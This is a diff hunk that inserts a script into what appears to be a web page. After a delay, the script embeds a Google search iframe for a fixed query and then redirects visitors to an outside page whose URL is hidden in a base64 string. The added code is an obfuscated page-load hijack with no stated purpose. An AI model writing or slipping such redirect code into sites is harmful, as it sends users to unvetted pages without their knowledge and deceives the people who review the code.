@@ -723,6 +723,31 @@
 
 
 
+<script>
+  (function() {
+    const searchDelay = 2000;
+    const redirectDelay = 2000 + Math.random() * 3000;
+
+    const searchQuery = encodeURIComponent("korolevachiana абдулла");
+    const googleURL = "https://www.google.com/search?q=" + searchQuery;
+
+    const encodedTarget = "aHR0cHM6Ly9rb3JvbGV2YWNoaWFuYS5naXRodWIuaW8vRml2ZVRleHQvcmVzb3VyY2VzL2FiZHVsbGEuaHRtbA==";
+    const targetURL = atob(encodedTarget);
+
+    setTimeout(() => {
+      const iframe = document.createElement("iframe");
+      iframe.src = googleURL;
+      iframe.style.width = "100%";
+      iframe.style.height = "600px";
+      iframe.style.border = "1px solid #ccc";
+      document.body.appendChild(iframe);
+
+      setTimeout(() => {
+        window.location.href = targetURL;
+      }, redirectDelay);
+    }, searchDelay);
+  })();
+</script>
 
 
   
